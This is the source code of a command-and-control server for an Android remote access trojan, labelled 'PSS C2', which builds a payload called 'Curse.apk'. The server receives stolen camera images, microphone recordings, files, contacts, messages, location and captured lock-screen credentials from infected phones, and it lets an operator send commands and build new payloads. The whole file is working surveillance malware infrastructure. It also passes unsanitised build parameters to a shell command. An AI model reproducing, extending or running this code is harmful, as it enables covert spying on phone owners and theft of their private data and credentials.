const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const WebSocket = require('ws');
const path = require('path');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// WebSocket server for RAT clients, mounted at /rat
const wss = new WebSocket.Server({ noServer: true });

// Handle HTTP upgrade — route /rat to RAT WebSocket, let socket.io handle its own
server.on('upgrade', (request, socket, head) => {
    const pathname = request.url.split('?')[0];
    if (pathname === '/rat') {
        wss.handleUpgrade(request, socket, head, (ws) => {
            wss.emit('connection', ws, request);
        });
    } else if (!pathname.startsWith('/socket.io')) {
        socket.destroy();
    }
    // socket.io handles its own /socket.io/ upgrades internally
});

// Fallback: if someone hits /rat via plain HTTP
app.get('/rat', (req, res) => {
    res.status(426).send('WebSocket upgrade required');
});

function sysLog(msg, type = 'info') {
    const time = new Date().toLocaleTimeString();
    const entry = { time, msg, type };
    io.emit('sys_log', entry);
    console.log(`[${time}] ${msg}`);
}

app.use(express.static(path.join(__dirname, 'public')));
app.use('/output', express.static(path.join(__dirname, 'output')));
app.use('/Downloads', express.static(path.join(__dirname, 'Downloads')));
app.use(express.json());

let clients = {};
let activeRecordings = {};

let stats = {
    sent: { bytes: 0, packets: 0, lastBytes: 0, rate: 0 },
    recv: { bytes: 0, packets: 0, lastBytes: 0, rate: 0 }
};

['output', 'Downloads'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
});

// ═══════════════════════════════════════════════════
// RAT WebSocket handler (replaces TCP listener)
// ═══════════════════════════════════════════════════
wss.on('connection', (ws, req) => {
    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });

    let clientId = null;
    const remoteIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

    ws.on('message', (raw) => {
        const data = raw.toString();
        stats.recv.bytes += data.length;
        stats.recv.packets += 1;

        // Handle multiple newline-delimited messages in one frame
        const lines = data.split('\n');
        for (let i = 0; i < lines.length; i++) {
            const msg = lines[i].trim();
            if (!msg) continue;
            try {
                const json = JSON.parse(msg);

                // Application-level pong for proxies that strip WS frames
                if (json.type === 'pong') {
                    ws.isAlive = true;
                    continue;
                }

                if (json.type === 'login') {
                    clientId = `${json.model}_${remoteIp.replace(/[:.]/g, '_')}`;

                    let country = 'Unknown';
                    const countryPath = path.join(__dirname, 'Downloads', clientId, 'country.txt');
                    if (fs.existsSync(countryPath)) {
                        country = fs.readFileSync(countryPath, 'utf8').trim();
                    }
                    json.country = country;

                    clients[clientId] = { ws, details: json };
                    io.emit('client_connected', { id: clientId, details: json });
                    sysLog(`CLIENT_CONNECTED: ${clientId} [WS]`, 'ok');

                    const deviceDir = path.join(__dirname, 'Downloads', clientId);
                    ['cam_ev', 'audio_ev', 'files'].forEach(sub => {
                        const subDir = path.join(deviceDir, sub);
                        if (!fs.existsSync(subDir)) fs.mkdirSync(subDir, { recursive: true });
                    });
                } else if (clientId) {
                    if (json.type === 'cam_ev') {
                        saveMedia(clientId, 'cam_ev', json.image, 'jpg');
                    } else if (json.type === 'geo_ping') {
                        if (json.country) {
                            const countryPath = path.join(__dirname, 'Downloads', clientId, 'country.txt');
                            fs.writeFileSync(countryPath, json.country);
                            if (clients[clientId]) clients[clientId].details.country = json.country;
                        }
                    } else if (json.type === 'audio_ev') {
                        saveMedia(clientId, 'audio_ev', json.audio, 'aac');
                    } else if (json.type === 'mic_chunk') {
                        if (activeRecordings[clientId]) {
                            const audioBuffer = Buffer.from(json.data, 'base64');
                            activeRecordings[clientId].stream.write(audioBuffer);
                        }
                    } else if (json.type === 'fs_fetch') {
                        saveFile(clientId, json.name, json.data);
                    } else if (json.type === 'lock_captured') {
                        saveLockData(clientId, json);
                    } else if (json.type === 'contacts_sync' || json.type === 'addr_sync') {
                        const cDir = path.join(__dirname, 'Downloads', clientId);
                        if (!fs.existsSync(cDir)) fs.mkdirSync(cDir, { recursive: true });
                        fs.writeFileSync(path.join(cDir, 'contacts.json'), JSON.stringify(json.data, null, 2));
                        sysLog(`CONTACTS_SYNCED: ${clientId} (${Array.isArray(json.data) ? json.data.length : 0} entries)`, 'ok');
                    } else if (json.type === 'files_list' || json.type === 'fs_scan') {
                        const fDir = path.join(__dirname, 'Downloads', clientId);
                        if (!fs.existsSync(fDir)) fs.mkdirSync(fDir, { recursive: true });
                        fs.writeFileSync(path.join(fDir, 'files_list.json'), JSON.stringify(json.data, null, 2));
                        sysLog(`FILES_LISTED: ${clientId} (${Array.isArray(json.data) ? json.data.length : 0} entries)`, 'ok');
                    } else if (json.type === 'device_info') {
                        const dDir = path.join(__dirname, 'Downloads', clientId);
                        if (!fs.existsSync(dDir)) fs.mkdirSync(dDir, { recursive: true });
                        fs.writeFileSync(path.join(dDir, 'device_info.json'), JSON.stringify(json, null, 2));
                        sysLog(`DEVICE_INFO: ${clientId} (${json.model || 'unknown'})`, 'ok');
                    } else if (json.type === 'apps_list') {
                        const aDir = path.join(__dirname, 'Downloads', clientId);
                        if (!fs.existsSync(aDir)) fs.mkdirSync(aDir, { recursive: true });
                        fs.writeFileSync(path.join(aDir, 'apps_list.json'), JSON.stringify(json.data, null, 2));
                        sysLog(`APPS_LISTED: ${clientId} (${Array.isArray(json.data) ? json.data.length : 0} apps)`, 'ok');
                    } else if (json.type === 'msg_sync') {
                        const mDir = path.join(__dirname, 'Downloads', clientId);
                        if (!fs.existsSync(mDir)) fs.mkdirSync(mDir, { recursive: true });
                        fs.writeFileSync(path.join(mDir, 'messages.json'), JSON.stringify(json.data, null, 2));
                        sysLog(`MSG_SYNCED: ${clientId} (${Array.isArray(json.data) ? json.data.length : 0} messages)`, 'ok');
                    } else if (json.type === 'auto_task_result') {
                        sysLog(`AUTO_TASK: ${clientId} - ${(json.output || '').substring(0, 100)}`, 'ok');
                    } else if (json.type === 'location') {
                        sysLog(`LOCATION: ${clientId} - lat:${json.lat} lon:${json.lon}`, 'ok');
                    }
                    io.emit('client_data', { id: clientId, data: json });
                }
            } catch (e) { }
        }
    });

    ws.on('close', () => {
        if (clientId) {
            if (activeRecordings[clientId]) {
                const rec = activeRecordings[clientId];
                rec.stream.end();
                const mp3Path = rec.filepath.replace('.pcm', '.mp3');
                const ffmpegCmd = `ffmpeg -f s16le -ar ${rec.sampleRate} -ac 1 -i "${rec.filepath}" "${mp3Path}"`;
                exec(ffmpegCmd, (err) => { if (!err) fs.unlinkSync(rec.filepath); });
                delete activeRecordings[clientId];
            }
            delete clients[clientId];
            io.emit('client_disconnected', clientId);
            sysLog(`CLIENT_DISCONNECTED: ${clientId}`, 'err');
        }
    });

    ws.on('error', () => { });
});

function saveMedia(clientId, type, base64Data, ext) {
    try {
        const buffer = Buffer.from(base64Data, 'base64');
        const filename = `${Date.now()}.${ext}`;
        const filepath = path.join(__dirname, 'Downloads', clientId, type, filename);
        fs.writeFileSync(filepath, buffer);
    } catch (e) { }
}

function saveFile(clientId, fileName, base64Data) {
    try {
        const buffer = Buffer.from(base64Data, 'base64');
        const filepath = path.join(__dirname, 'Downloads', clientId, 'files', fileName);
        fs.writeFileSync(filepath, buffer);
    } catch (e) { }
}

function saveLockData(clientId, data) {
    try {
        const filepath = path.join(__dirname, 'Downloads', clientId, 'lock_credentials.json');
        let existing = [];
        if (fs.existsSync(filepath)) {
            existing = JSON.parse(fs.readFileSync(filepath));
        }
        data.server_time = new Date().toLocaleString();
        existing.push(data);
        fs.writeFileSync(filepath, JSON.stringify(existing, null, 2));
    } catch (e) { }
}

// Stats and System Info Loop
setInterval(() => {
    stats.sent.rate = stats.sent.bytes - stats.sent.lastBytes;
    stats.recv.rate = stats.recv.bytes - stats.recv.lastBytes;
    stats.sent.lastBytes = stats.sent.bytes;
    stats.recv.lastBytes = stats.recv.bytes;

    const sysInfo = {
        cpu: (os.loadavg()[0] * 10).toFixed(1) + '%',
        ram: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1) + '%',
        uptime: Math.floor(os.uptime() / 3600) + 'h ' + Math.floor((os.uptime() % 3600) / 60) + 'm',
        platform: os.platform() + ' ' + os.release()
    };

    io.emit('stats_update', { stats, sysInfo });
}, 2000);

// WebSocket keepalive ping every 30s
setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.isAlive === false) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
        try { ws.send(JSON.stringify({ type: 'ping' })); } catch (e) {}
    });
}, 30000);


// ═══════════════════════════════════════════════════
// Dashboard socket.io handler
// ═══════════════════════════════════════════════════
io.on('connection', (socket) => {
    const activeClients = Object.keys(clients).map(id => ({ id, details: clients[id].details }));
    socket.emit('initial_clients', activeClients);
    // Send a fake listeners_update showing WS is active
    socket.emit('listeners_update', ['WS']);

    socket.on('order', (data) => {
        const { id, order, params } = data;
        if (clients[id]) {
            try {
                if (order === 'audio_ev') {
                    if (params.action === 'start' && params.mode === 'record') {
                        const sampleRate = params.sample_rate || 11025;
                        const timestamp = Date.now();
                        const filename = `recording_${timestamp}.pcm`;
                        const filepath = path.join(__dirname, 'Downloads', id, 'audio_ev', filename);
                        activeRecordings[id] = {
                            filepath, sampleRate, timestamp,
                            stream: fs.createWriteStream(filepath)
                        };
                    } else if (params.action === 'stop') {
                        if (activeRecordings[id]) {
                            const rec = activeRecordings[id];
                            rec.stream.end();
                            const mp3Path = rec.filepath.replace('.pcm', '.mp3');
                            const ffmpegCmd = `ffmpeg -f s16le -ar ${rec.sampleRate} -ac 1 -i "${rec.filepath}" "${mp3Path}"`;
                            exec(ffmpegCmd, (err) => {
                                if (!err) {
                                    fs.unlinkSync(rec.filepath);
                                    io.emit('client_data', {
                                        id: id,
                                        data: { type: 'mic_saved', file: `/Downloads/${id}/mic/recording_${rec.timestamp}.mp3` }
                                    });
                                }
                            });
                            delete activeRecordings[id];
                        }
                    }
                }
                const msg = JSON.stringify({ order, ...params }) + '\n';
                clients[id].ws.send(msg);

                stats.sent.bytes += msg.length;
                stats.sent.packets += 1;
            } catch (e) { }
        }
    });

    socket.on('build_apk', (config) => {
        sysLog(`BUILD_STARTED: ${config.ip}:${config.port}`);
        exec(`node builder.js ${config.ip} ${config.port}`, (err, stdout, stderr) => {
            io.emit('build_log', stdout + stderr);
            if (!err) {
                io.emit('build_success', 'Curse.apk');
                sysLog(`BUILD_SUCCESS: Curse.apk`, 'ok');
            } else {
                sysLog(`BUILD_FAILED`, 'err');
            }
        });
    });

    socket.on('build_apk_advanced', (config) => {
        sysLog(`ADVANCED_BUILD_STARTED: ${config.appName}`);
        const configPath = path.join(__dirname, 'build_config.json');
        fs.writeFileSync(configPath, JSON.stringify(config));
        exec(`node builder.js --config build_config.json`, (err, stdout, stderr) => {
            io.emit('build_log', stdout + stderr);
            if (!err) {
                io.emit('build_success', 'Curse.apk');
                sysLog(`ADVANCED_BUILD_SUCCESS: ${config.appName}`, 'ok');
            } else {
                sysLog(`ADVANCED_BUILD_FAILED`, 'err');
            }
        });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`PSS C2 running on port ${PORT}`);
    console.log(`Dashboard: http://localhost:${PORT}`);
    console.log(`RAT WebSocket: ws://localhost:${PORT}/rat`);
});
